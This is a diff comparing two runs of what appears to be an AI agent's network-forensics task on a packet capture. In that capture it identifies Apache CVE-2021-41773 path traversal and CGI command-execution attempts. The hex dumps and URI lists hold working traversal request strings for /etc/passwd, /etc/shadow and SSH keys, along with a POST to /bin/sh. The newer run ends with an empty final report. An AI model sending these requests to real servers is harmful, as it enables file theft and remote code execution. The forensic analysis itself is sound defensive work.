@@ -1,64 +1,188 @@
 [Task 2]
-Step 1: The PCAP summary indicates multiple TCP conversations between two IP addresses, 172.18.0.1 and 172.18.0.2, on port 80. This suggests HTTP traffic, which is commonly associated with web services. To identify the specific service or application involved, I need to extract HTTP requests and their headers from the PCAP file. This will help determine the nature of the service or application being accessed.
+Step 1: The PCAP summary indicates multiple TCP conversations between two IP addresses, 172.18.0.1 and 172.18.0.2, all on port 80. This suggests HTTP traffic, which is commonly associated with web services. To identify the specific service or application involved, I need to extract HTTP requests and their headers from the PCAP file. This will help determine the service or application name.
 
-Let's proceed with extracting HTTP requests and their headers from the PCAP file.
-Step 2: TsharkExpert analysis did not complete successfully.
-Step 3: 
-Step 4: Final report from the forensic expert:
-The analysis of the PCAP file revealed a series of HTTP requests attempting to access sensitive files on the server, such as '/etc/passwd', '/etc/shadow', and other configuration and log files. This indicates a potential directory traversal attack, where the attacker is trying to access files outside the web server's root directory by manipulating the URL path. The HTTP response codes showed a mix of successful (200 OK) and unsuccessful (403 Forbidden, 404 Not Found) requests, suggesting that some of the attack attempts were successful while others were blocked or the resources were not found. The absence of User-Agent headers and the presence of encoded characters in the request URIs further suggest the use of automated attack tools or scripts. The executed command successfully extracted the HTTP request URIs, confirming the presence of directory traversal patterns.
-Executed command: -Y "http.request" -T fields -e http.request.uri
+Let's proceed with extracting HTTP requests and their headers to identify the service or application involved.
+Step 2: Final report from the forensic expert:
+The analysis of the PCAP file revealed multiple HTTP requests attempting to access sensitive files and execute a shell command on the server. These requests indicate potential exploitation attempts, possibly involving directory traversal and remote code execution. The raw packet data was extracted using the '-x' option, providing a hex and ASCII dump of the packet data, which confirmed the nature of the requests. The requests targeted files such as '/etc/passwd', '/etc/shadow', and attempted to execute '/bin/sh' via a POST request to '/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'. This suggests an attempt to exploit a vulnerability in the server to gain unauthorized access or execute arbitrary commands.
+Executed command: -Y "http.request" -x
 
-Command output: /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
-/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts
-/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/hostname
-/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/group
-/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/root/.bash_history
-/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/authorized_keys
-/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/var/log/syslog
-/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/var/log/auth.log
-/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/var/www/html/config.php
-/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
+Command output: 0000  02 42 ac 12 00 02 02 42 d2 fd a2 a4 08 00 45 00   .B.....B......E.
+0010  00 94 1f b7 40 00 40 06 c2 85 ac 12 00 01 ac 12   ....@.@.........
+0020  00 02 88 7a 00 50 15 57 54 5f 09 96 69 75 80 18   ...z.P.WT_..iu..
+0030  01 f6 58 ae 00 00 01 01 08 0a 9f 42 e7 b3 62 36   ..X........B..b6
+0040  c5 d0 47 45 54 20 2f 69 63 6f 6e 73 2f 2e 25 32   ..GET /icons/.%2
+0050  65 2f 25 32 65 25 32 65 2f 25 32 65 25 32 65 2f   e/%2e%2e/%2e%2e/
+0060  25 32 65 25 32 65 2f 65 74 63 2f 70 61 73 73 77   %2e%2e/etc/passw
+0070  64 20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74   d HTTP/1.1..Host
+0080  3a 20 6c 6f 63 61 6c 68 6f 73 74 0d 0a 43 6f 6e   : localhost..Con
+0090  6e 65 63 74 69 6f 6e 3a 20 63 6c 6f 73 65 0d 0a   nection: close..
+00a0  0d 0a                                             ..
+
+0000  02 42 ac 12 00 02 02 42 d2 fd a2 a4 08 00 45 00   .B.....B......E.
+0010  00 94 06 8f 40 00 40 06 db ad ac 12 00 01 ac 12   ....@.@.........
+0020  00 02 88 84 00 50 e0 75 d9 5d 51 f1 cc 03 80 18   .....P.u.]Q.....
+0030  01 f6 58 ae 00 00 01 01 08 0a 9f 42 e8 06 62 36   ..X........B..b6
+0040  c6 27 47 45 54 20 2f 69 63 6f 6e 73 2f 2e 25 32   .'GET /icons/.%2
+0050  65 2f 25 32 65 25 32 65 2f 25 32 65 25 32 65 2f   e/%2e%2e/%2e%2e/
+0060  25 32 65 25 32 65 2f 65 74 63 2f 73 68 61 64 6f   %2e%2e/etc/shado
+0070  77 20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74   w HTTP/1.1..Host
+0080  3a 20 6c 6f 63 61 6c 68 6f 73 74 0d 0a 43 6f 6e   : localhost..Con
+0090  6e 65 63 74 69 6f 6e 3a 20 63 6c 6f 73 65 0d 0a   nection: close..
+00a0  0d 0a                                             ..
+
+0000  02 42 ac 12 00 02 02 42 d2 fd a2 a4 08 00 45 00   .B.....B......E.
+0010  00 93 81 3e 40 00 40 06 60 ff ac 12 00 01 ac 12   ...>@.@.`.......
+0020  00 02 88 90 00 50 2a 96 52 7a 22 4a 7d 7d 80 18   .....P*.Rz"J}}..
+0030  01 f6 58 ad 00 00 01 01 08 0a 9f 42 e8 3f 62 36   ..X........B.?b6
+0040  c6 5f 47 45 54 20 2f 69 63 6f 6e 73 2f 2e 25 32   ._GET /icons/.%2
+0050  65 2f 25 32 65 25 32 65 2f 25 32 65 25 32 65 2f   e/%2e%2e/%2e%2e/
+0060  25 32 65 25 32 65 2f 65 74 63 2f 68 6f 73 74 73   %2e%2e/etc/hosts
+0070  20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a    HTTP/1.1..Host:
+0080  20 6c 6f 63 61 6c 68 6f 73 74 0d 0a 43 6f 6e 6e    localhost..Conn
+0090  65 63 74 69 6f 6e 3a 20 63 6c 6f 73 65 0d 0a 0d   ection: close...
+00a0  0a                                                .
+
+0000  02 42 ac 12 00 02 02 42 d2 fd a2 a4 08 00 45 00   .B.....B......E.
+0010  00 96 10 d8 40 00 40 06 d1 62 ac 12 00 01 ac 12   ....@.@..b......
+0020  00 02 88 9a 00 50 44 c8 39 81 1c bd f9 a3 80 18   .....PD.9.......
+0030  01 f6 58 b0 00 00 01 01 08 0a 9f 42 e8 77 62 36   ..X........B.wb6
+0040  c6 97 47 45 54 20 2f 69 63 6f 6e 73 2f 2e 25 32   ..GET /icons/.%2
+0050  65 2f 25 32 65 25 32 65 2f 25 32 65 25 32 65 2f   e/%2e%2e/%2e%2e/
+0060  25 32 65 25 32 65 2f 65 74 63 2f 68 6f 73 74 6e   %2e%2e/etc/hostn
+0070  61 6d 65 20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f   ame HTTP/1.1..Ho
+0080  73 74 3a 20 6c 6f 63 61 6c 68 6f 73 74 0d 0a 43   st: localhost..C
+0090  6f 6e 6e 65 63 74 69 6f 6e 3a 20 63 6c 6f 73 65   onnection: close
+00a0  0d 0a 0d 0a                                       ....
+
+0000  02 42 ac 12 00 02 02 42 d2 fd a2 a4 08 00 45 00   .B.....B......E.
+0010  00 93 67 98 40 00 40 06 7a a5 ac 12 00 01 ac 12   ..g.@.@.z.......
+0020  00 02 88 a6 00 50 b3 de 40 11 97 37 65 d9 80 18   .....P..@..7e...
+0030  01 f6 58 ad 00 00 01 01 08 0a 9f 42 e8 9b 62 36   ..X........B..b6
+0040  c6 bb 47 45 54 20 2f 69 63 6f 6e 73 2f 2e 25 32   ..GET /icons/.%2
+0050  65 2f 25 32 65 25 32 65 2f 25 32 65 25 32 65 2f   e/%2e%2e/%2e%2e/
+0060  25 32 65 25 32 65 2f 65 74 63 2f 67 72 6f 75 70   %2e%2e/etc/group
+0070  20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a    HTTP/1.1..Host:
+0080  20 6c 6f 63 61 6c 68 6f 73 74 0d 0a 43 6f 6e 6e    localhost..Conn
+0090  65 63 74 69 6f 6e 3a 20 63 6c 6f 73 65 0d 0a 0d   ection: close...
+00a0  0a                                                .
+
+0000  02 42 ac 12 00 02 02 42 d2 fd a2 a4 08 00 45 00   .B.....B......E.
+0010  00 9c 49 f5 40 00 40 06 98 3f ac 12 00 01 ac 12   ..I.@.@..?......
+0020  00 02 88 ac 00 50 c1 95 7d e6 b7 ab 71 f3 80 18   .....P..}...q...
+0030  01 f6 58 b6 00 00 01 01 08 0a 9f 42 e8 ca 62 36   ..X........B..b6
+0040  c6 ea 47 45 54 20 2f 69 63 6f 6e 73 2f 2e 25 32   ..GET /icons/.%2
+0050  65 2f 25 32 65 25 32 65 2f 25 32 65 25 32 65 2f   e/%2e%2e/%2e%2e/
+0060  25 32 65 25 32 65 2f 72 6f 6f 74 2f 2e 62 61 73   %2e%2e/root/.bas
+0070  68 5f 68 69 73 74 6f 72 79 20 48 54 54 50 2f 31   h_history HTTP/1
+0080  2e 31 0d 0a 48 6f 73 74 3a 20 6c 6f 63 61 6c 68   .1..Host: localh
+0090  6f 73 74 0d 0a 43 6f 6e 6e 65 63 74 69 6f 6e 3a   ost..Connection:
+00a0  20 63 6c 6f 73 65 0d 0a 0d 0a                      close....
+
+0000  02 42 ac 12 00 02 02 42 d2 fd a2 a4 08 00 45 00   .B.....B......E.
+0010  00 a3 07 9d 40 00 40 06 da 90 ac 12 00 01 ac 12   ....@.@.........
+0020  00 02 88 bc 00 50 9e b1 71 b5 23 6c f7 04 80 18   .....P..q.#l....
+0030  01 f6 58 bd 00 00 01 01 08 0a 9f 42 e8 f7 62 36   ..X........B..b6
+0040  c7 17 47 45 54 20 2f 69 63 6f 6e 73 2f 2e 25 32   ..GET /icons/.%2
+0050  65 2f 25 32 65 25 32 65 2f 25 32 65 25 32 65 2f   e/%2e%2e/%2e%2e/
+0060  25 32 65 25 32 65 2f 72 6f 6f 74 2f 2e 73 73 68   %2e%2e/root/.ssh
+0070  2f 61 75 74 68 6f 72 69 7a 65 64 5f 6b 65 79 73   /authorized_keys
+0080  20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a    HTTP/1.1..Host:
+0090  20 6c 6f 63 61 6c 68 6f 73 74 0d 0a 43 6f 6e 6e    localhost..Conn
+00a0  65 63 74 69 6f 6e 3a 20 63 6c 6f 73 65 0d 0a 0d   ection: close...
+00b0  0a                                                .
+
+0000  02 42 ac 12 00 02 02 42 d2 fd a2 a4 08 00 45 00   .B.....B......E.
+0010  00 98 f9 68 40 00 40 06 e8 cf ac 12 00 01 ac 12   ...h@.@.........
+0020  00 02 88 c4 00 50 ac 90 27 20 ce 62 8d d7 80 18   .....P..' .b....
+0030  01 f6 58 b2 00 00 01 01 08 0a 9f 42 e9 24 62 36   ..X........B.$b6
+0040  c7 44 47 45 54 20 2f 69 63 6f 6e 73 2f 2e 25 32   .DGET /icons/.%2
+0050  65 2f 25 32 65 25 32 65 2f 25 32 65 25 32 65 2f   e/%2e%2e/%2e%2e/
+0060  25 32 65 25 32 65 2f 76 61 72 2f 6c 6f 67 2f 73   %2e%2e/var/log/s
+0070  79 73 6c 6f 67 20 48 54 54 50 2f 31 2e 31 0d 0a   yslog HTTP/1.1..
+0080  48 6f 73 74 3a 20 6c 6f 63 61 6c 68 6f 73 74 0d   Host: localhost.
+0090  0a 43 6f 6e 6e 65 63 74 69 6f 6e 3a 20 63 6c 6f   .Connection: clo
+00a0  73 65 0d 0a 0d 0a                                 se....
+
+0000  02 42 ac 12 00 02 02 42 d2 fd a2 a4 08 00 45 00   .B.....B......E.
+0010  00 9a 33 76 40 00 40 06 ae c0 ac 12 00 01 ac 12   ..3v@.@.........
+0020  00 02 88 d0 00 50 61 03 44 ad 33 07 96 20 80 18   .....Pa.D.3.. ..
+0030  01 f6 58 b4 00 00 01 01 08 0a 9f 42 e9 6e 62 36   ..X........B.nb6
+0040  c7 8c 47 45 54 20 2f 69 63 6f 6e 73 2f 2e 25 32   ..GET /icons/.%2
+0050  65 2f 25 32 65 25 32 65 2f 25 32 65 25 32 65 2f   e/%2e%2e/%2e%2e/
+0060  25 32 65 25 32 65 2f 76 61 72 2f 6c 6f 67 2f 61   %2e%2e/var/log/a
+0070  75 74 68 2e 6c 6f 67 20 48 54 54 50 2f 31 2e 31   uth.log HTTP/1.1
+0080  0d 0a 48 6f 73 74 3a 20 6c 6f 63 61 6c 68 6f 73   ..Host: localhos
+0090  74 0d 0a 43 6f 6e 6e 65 63 74 69 6f 6e 3a 20 63   t..Connection: c
+00a0  6c 6f 73 65 0d 0a 0d 0a                           lose....
+
+0000  02 42 ac 12 00 02 02 42 d2 fd a2 a4 08 00 45 00   .B.....B......E.
+0010  00 a1 a9 72 40 00 40 06 38 bd ac 12 00 01 ac 12   ...r@.@.8.......
+0020  00 02 88 d2 00 50 23 56 86 0d bb 65 f4 8d 80 18   .....P#V...e....
+0030  01 f6 58 bb 00 00 01 01 08 0a 9f 42 e9 a5 62 36   ..X........B..b6
+0040  c7 c5 47 45 54 20 2f 69 63 6f 6e 73 2f 2e 25 32   ..GET /icons/.%2
+0050  65 2f 25 32 65 25 32 65 2f 25 32 65 25 32 65 2f   e/%2e%2e/%2e%2e/
+0060  25 32 65 25 32 65 2f 76 61 72 2f 77 77 77 2f 68   %2e%2e/var/www/h
+0070  74 6d 6c 2f 63 6f 6e 66 69 67 2e 70 68 70 20 48   tml/config.php H
+0080  54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a 20 6c   TTP/1.1..Host: l
+0090  6f 63 61 6c 68 6f 73 74 0d 0a 43 6f 6e 6e 65 63   ocalhost..Connec
+00a0  74 69 6f 6e 3a 20 63 6c 6f 73 65 0d 0a 0d 0a      tion: close....
+
+0000  02 42 ac 12 00 02 02 42 d2 fd a2 a4 08 00 45 00   .B.....B......E.
+0010  00 da 61 98 40 00 40 06 80 5e ac 12 00 01 ac 12   ..a.@.@..^......
+0020  00 02 88 e2 00 50 36 27 59 87 b4 7f fe 09 80 18   .....P6'Y.......
+0030  01 f6 58 f4 00 00 01 01 08 0a 9f 42 e9 de 62 36   ..X........B..b6
+0040  c7 ff 50 4f 53 54 20 2f 63 67 69 2d 62 69 6e 2f   ..POST /cgi-bin/
+0050  2e 25 32 65 2f 2e 25 32 65 2f 2e 25 32 65 2f 2e   .%2e/.%2e/.%2e/.
+0060  25 32 65 2f 62 69 6e 2f 73 68 20 48 54 54 50 2f   %2e/bin/sh HTTP/
+0070  31 2e 31 0d 0a 48 6f 73 74 3a 20 6c 6f 63 61 6c   1.1..Host: local
+0080  68 6f 73 74 0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65   host..Content-Le
+0090  6e 67 74 68 3a 20 39 0d 0a 43 6f 6e 74 65 6e 74   ngth: 9..Content
+00a0  2d 54 79 70 65 3a 20 61 70 70 6c 69 63 61 74 69   -Type: applicati
+00b0  6f 6e 2f 78 2d 77 77 77 2d 66 6f 72 6d 2d 75 72   on/x-www-form-ur
+00c0  6c 65 6e 63 6f 64 65 64 0d 0a 43 6f 6e 6e 65 63   lencoded..Connec
+00d0  74 69 6f 6e 3a 20 63 6c 6f 73 65 0d 0a 0d 0a 65   tion: close....e
+00e0  63 68 6f 3b 65 63 68 6f                           cho;echo
 
 
-Step 5: The analysis of the PCAP file has revealed a series of HTTP requests attempting to access sensitive files on the server, indicating a potential directory traversal attack. The presence of encoded characters in the request URIs and the absence of User-Agent headers suggest the use of automated attack tools or scripts. Now, I need to identify the relevant CVE associated with this type of attack. 
 
-I will perform a web search to find the CVE related to directory traversal attacks on web servers.
-Step 6: Search result for query: 'CVE directory traversal attack web server'
-Information 1: as Directory Traversal (CWE-35), is a vulnerability that allows an attacker to read arbitrary files present on the server hosting a web application. In some cases, this vulnerability can even allow an attacker to write files or modify their paths, altering the behavior of the web application or, in the worst-case scenario, completely compromising the server. How does it work? Let’s imagine having a web application that allows users to search for images and display them on a page. After performing a search, 
-Information 2: effect: As long as a "." was URL encoded, it was not recognized as a. "," and we got good old directory traversal back. With this vulnerability, an attacker can read arbitrary files as long as the webserver has read access to the respective file. The vulnerability is easy enough to exploit and is already widely exploited. An attacker will typically first try to look for /etc/passwd on Unix systems. /etc/passwd is always present and readable (unless you have some additional restrictions enabled around it). T
-Information 3: s Contact Us Hacking Web Servers Directory Traversal Attacks on Web Servers Jan, 2025 Table of Contents Contribute 5 min read @usefulcodes 🥇 Directory Traversal AttacksHow Directory Traversal Exploits WorkIdentifying Vulnerable Web ApplicationsExploiting File Disclosure VulnerabilitiesTools Used in Directory Traversal ExploitsSummary If you're looking to enhance your understanding of web server vulnerabilities, you can get training directly from this article. Directory traversal attacks are a fundamental co
-Information 4: ile Disclosure VulnerabilitiesTools Used in Directory Traversal ExploitsSummary If you're looking to enhance your understanding of web server vulnerabilities, you can get training directly from this article. Directory traversal attacks are a fundamental concept in web security that every developer, security analyst, and ethical hacker should be familiar with. This article will provide a comprehensive exploration of what directory traversal attacks are, how they work, and how to identify and exploit such vul
-Information 5: nerabilities. Let's dive deeper into this critical topic to understand how attackers manipulate web servers to access unauthorized files.Directory Traversal AttacksDirectory traversal attacks, also known as path traversal attacks, are one of the most common vulnerabilities in web applications. These attacks target web servers to gain unauthorized access to files and directories outside of the web application's root directory. Through maliciously crafted requests, attackers can exploit poorly implemented inp
-Step 7: 
-Step 8: Stored memory 10f79dec-cd1a-48c7-9d8d-141c6a79f619
-Step 9: The analysis of the PCAP file has revealed a series of HTTP requests attempting to access sensitive files on the server, indicating a potential directory traversal attack. The presence of encoded characters in the request URIs and the absence of User-Agent headers suggest the use of automated attack tools or scripts. The web search has confirmed that directory traversal attacks are a common vulnerability in web applications, allowing attackers to access unauthorized files. Now, I need to determine if the service or application is vulnerable to this attack and if the attack was successful.
+Step 3: The analysis of the PCAP file has revealed multiple HTTP requests attempting to access sensitive files and execute a shell command on the server. These requests indicate potential exploitation attempts, possibly involving directory traversal and remote code execution. The raw packet data was extracted using the '-x' option, providing a hex and ASCII dump of the packet data, which confirmed the nature of the requests. The requests targeted files such as '/etc/passwd', '/etc/shadow', and attempted to execute '/bin/sh' via a POST request to '/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'. This suggests an attempt to exploit a vulnerability in the server to gain unauthorized access or execute arbitrary commands.
 
-To proceed, I will analyze the HTTP response codes and the content of the responses to assess whether the attack was successful and if the service is vulnerable. Let's extract the HTTP response codes and content from the PCAP file.
-Step 10: Final report from the forensic expert:
-The analysis of the PCAP file revealed a mix of HTTP response codes, including 200 (OK), 403 (Forbidden), and 404 (Not Found). The presence of 403 and 404 codes suggests that some requests were blocked or the requested resources were not found, which is typical in directory traversal attacks. However, the HTTP 200 responses indicate successful requests, and the content of these responses might reveal sensitive information or files that were accessed due to the attack.
-Executed command: -Y "http.response" -T fields -e http.response.code -e http.file_data
+Now, I need to identify the relevant CVE associated with these types of exploitation attempts. I will perform a web search to find the CVE related to directory traversal and remote code execution vulnerabilities in web servers, particularly those involving the '/cgi-bin/' path. 
 
-Command output: 200	726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f7661722f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a
-403	3c21444f43545950452048544d4c205055424c494320222d2f2f494554462f2f4454442048544d4c20322e302f2f454e223e0a3c68746d6c3e3c686561643e0a3c7469746c653e34303320466f7262696464656e3c2f7469746c653e0a3c2f686561643e3c626f64793e0a3c68313e466f7262696464656e3c2f68313e0a3c703e596f7520646f6e27742068617665207065726d697373696f6e20746f206163636573732074686973207265736f757263652e3c2f703e0a3c2f626f64793e3c2f68746d6c3e0a
-200	3132372e302e302e31096c6f63616c686f73740a3a3a31096c6f63616c686f7374206970362d6c6f63616c686f7374206970362d6c6f6f706261636b0a666530303a3a30096970362d6c6f63616c6e65740a666630303a3a30096970362d6d636173747072656669780a666630323a3a31096970362d616c6c6e6f6465730a666630323a3a32096970362d616c6c726f75746572730a3137322e31382e302e32093134383264663966623465320a
-200	3134383264663966623465320a
-200	726f6f743a783a303a0a6461656d6f6e3a783a313a0a62696e3a783a323a0a7379733a783a333a0a61646d3a783a343a0a7474793a783a353a0a6469736b3a783a363a0a6c703a783a373a0a6d61696c3a783a383a0a6e6577733a783a393a0a757563703a783a31303a0a6d616e3a783a31323a0a70726f78793a783a31333a0a6b6d656d3a783a31353a0a6469616c6f75743a783a32303a0a6661783a783a32313a0a766f6963653a783a32323a0a6364726f6d3a783a32343a0a666c6f7070793a783a32353a0a746170653a783a32363a0a7375646f3a783a32373a0a617564696f3a783a32393a0a6469703a783a33303a0a7777772d646174613a783a33333a0a6261636b75703a783a33343a0a6f70657261746f723a783a33373a0a6c6973743a783a33383a0a6972633a783a33393a0a7372633a783a34303a0a676e6174733a783a34313a0a736861646f773a783a34323a0a75746d703a783a34333a0a766964656f3a783a34343a0a7361736c3a783a34353a0a706c75676465763a783a34363a0a73746166663a783a35303a0a67616d65733a783a36303a0a75736572733a783a3130303a0a6e6f67726f75703a783a36353533343a0a
-403	3c21444f43545950452048544d4c205055424c494320222d2f2f494554462f2f4454442048544d4c20322e302f2f454e223e0a3c68746d6c3e3c686561643e0a3c7469746c653e34303320466f7262696464656e3c2f7469746c653e0a3c2f686561643e3c626f64793e0a3c68313e466f7262696464656e3c2f68313e0a3c703e596f7520646f6e27742068617665207065726d697373696f6e20746f206163636573732074686973207265736f757263652e3c2f703e0a3c2f626f64793e3c2f68746d6c3e0a
-403	3c21444f43545950452048544d4c205055424c494320222d2f2f494554462f2f4454442048544d4c20322e302f2f454e223e0a3c68746d6c3e3c686561643e0a3c7469746c653e34303320466f7262696464656e3c2f7469746c653e0a3c2f686561643e3c626f64793e0a3c68313e466f7262696464656e3c2f68313e0a3c703e596f7520646f6e27742068617665207065726d697373696f6e20746f206163636573732074686973207265736f757263652e3c2f703e0a3c2f626f64793e3c2f68746d6c3e0a
-404	3c21444f43545950452048544d4c205055424c494320222d2f2f494554462f2f4454442048544d4c20322e302f2f454e223e0a3c68746d6c3e3c686561643e0a3c7469746c653e343034204e6f7420466f756e643c2f7469746c653e0a3c2f686561643e3c626f64793e0a3c68313e4e6f7420466f756e643c2f68313e0a3c703e546865207265717565737465642055524c20776173206e6f7420666f756e64206f6e2074686973207365727665722e3c2f703e0a3c2f626f64793e3c2f68746d6c3e0a
-404	3c21444f43545950452048544d4c205055424c494320222d2f2f494554462f2f4454442048544d4c20322e302f2f454e223e0a3c68746d6c3e3c686561643e0a3c7469746c653e343034204e6f7420466f756e643c2f7469746c653e0a3c2f686561643e3c626f64793e0a3c68313e4e6f7420466f756e643c2f68313e0a3c703e546865207265717565737465642055524c20776173206e6f7420666f756e64206f6e2074686973207365727665722e3c2f703e0a3c2f626f64793e3c2f68746d6c3e0a
-404	3c21444f43545950452048544d4c205055424c494320222d2f2f494554462f2f4454442048544d4c20322e302f2f454e223e0a3c68746d6c3e3c686561643e0a3c7469746c653e343034204e6f7420466f756e643c2f7469746c653e0a3c2f686561643e3c626f64793e0a3c68313e4e6f7420466f756e643c2f68313e0a3c703e546865207265717565737465642055524c20776173206e6f7420666f756e64206f6e2074686973207365727665722e3c2f703e0a3c2f626f64793e3c2f68746d6c3e0a
-200	0a
+Let's proceed with the web search to identify the CVE.
+Step 4: Search result for query: 'CVE directory traversal remote code execution cgi-bin'
+Information 1:  Leveraging the path traversal vulnerability, attackers can bypass security checks and access files and directories in the server’s file system through the cgi-bin directory. With mod_cgi enabled, they can execute scripts on the server. Steps to exploit CVE-2021-41773 Let's start by identifying the server version using an Nmap version detection scan to verify if it matches the vulnerable version. nmap -sV <IP-address/hostname> To execute the path traversal exploit, we'll send a request to the web server in 
+Information 2: ory directive allows an attacker to read arbitrary files such as passwd from the vulnerable server file system. Remote Code Execution While CVE-2021-41773 was initially documented as Path traversal and File disclosure vulnerability additional research concluded that the vulnerability can be further exploited to conduct remote code execution when mod_cgi module is enabled on the Apache HTTP server, this allows an attacker to leverage the path traversal vulnerability and call any binary on the system using HT
+Information 3: nvironment. In response to this vulnerability, we released ApacheCGI, a machine that showcases a path traversal vulnerability in Apache HTTP Server 2.4.49 and 2.4.50 (labeled CVE-2021-41773), which allows unauthenticated attackers to read files outside of the virtual directory path bounds. Furthermore, if CGI scripts are enabled, this could allow for remote code execution on the system. Play ApacheCGI today Hack The Box provides a wide range of scenarios to keep your team’s skills sharp and up-to-date. Orga
+Information 4: luded that the vulnerability can be further exploited to conduct remote code execution when mod_cgi module is enabled on the Apache HTTP server, this allows an attacker to leverage the path traversal vulnerability and call any binary on the system using HTTP POST requests. By default the mod_cgi module is disabled on Apache HTTP server by commenting the above line in the configuration file. Hence, when mod_cgi is enabled and “Require all granted” config is applied to the filesystem directory directive then 
+Information 5: ve, which allows public access, meaning everyone can request to the /usr/local/apache2/cgi-bin/ directory. By combining the logic flaw in the ap_normalize_path function that allows the path traversal bypass and a misconfigured Require all granted directive on the server, attackers can access files on the server files system outside intended directories. This vulnerability can be further exploited leading to Remote Code Execution if mod_cgi is enabled on the server. By default this module is not enabled on A
+Step 5: 
+Step 6: Stored memory 7735bead-6cc5-4021-aae5-0112aeaf07a8
+Step 7: The web search results have confirmed that the CVE associated with the observed directory traversal and remote code execution attempts is CVE-2021-41773. This vulnerability is related to the Apache HTTP Server, particularly when the mod_cgi module is enabled. The PCAP analysis showed attempts to access sensitive files and execute commands via the '/cgi-bin/' path, which aligns with the exploitation of this CVE.
+
+Next, I need to assess whether the service is vulnerable to this attack and if the attack was successful. To do this, I will analyze the server's responses to the HTTP requests in the PCAP file to check for any signs of successful exploitation or error messages indicating vulnerability.
+
+Let's proceed with extracting and analyzing the HTTP responses from the PCAP file to determine the vulnerability and success of the attack.
+Step 8: Final report from the forensic expert:
+The task was to extract HTTP responses and their status codes to analyze server responses for signs of successful exploitation or error messages. Initially, I extracted the HTTP response status codes, which showed a mix of 200, 403, and 404 status codes. To gain more insight into the server's behavior, I attempted to extract the full HTTP response headers and bodies. However, I encountered difficulties in identifying the correct fields for extracting HTTP response bodies. Despite searching the tshark manual, I was unable to find the appropriate fields for this purpose. Therefore, the final result includes only the HTTP response status codes extracted earlier.
+Executed command: -Y "http.response" -T fields -e http.response.code
+
+Command output: 200
+403
+200
+200
+200
+403
+403
+404
+404
+404
+200
 
 
-Step 11: The analysis of the PCAP file has revealed a series of HTTP requests attempting to access sensitive files on the server, indicating a potential directory traversal attack. The presence of encoded characters in the request URIs and the absence of User-Agent headers suggest the use of automated attack tools or scripts. The web search has confirmed that directory traversal attacks are a common vulnerability in web applications, allowing attackers to access unauthorized files. The HTTP response codes include 200 (OK), 403 (Forbidden), and 404 (Not Found), with the 200 responses indicating successful access to some files.
-
-Now, I need to determine the CVE identifier for this type of directory traversal attack and confirm the affected service. Based on the analysis, the service involved is likely a web server, given the HTTP traffic on port 80.
-
-I will now proceed to provide the final answer, summarizing the findings and conclusions.
-Step 12: FINAL REPORT:
-The analysis of the PCAP file revealed a series of HTTP requests attempting to access sensitive files on the server, such as '/etc/passwd', '/etc/shadow', and other configuration and log files. This indicates a potential directory traversal attack, where the attacker is trying to access files outside the web server's root directory by manipulating the URL path. The HTTP response codes showed a mix of successful (200 OK) and unsuccessful (403 Forbidden, 404 Not Found) requests, suggesting that some of the attack attempts were successful while others were blocked or the resources were not found. The absence of User-Agent headers and the presence of encoded characters in the request URIs further suggest the use of automated attack tools or scripts. The executed command successfully extracted the HTTP request URIs, confirming the presence of directory traversal patterns.
+Step 9: 
+Step 10: FINAL REPORT:
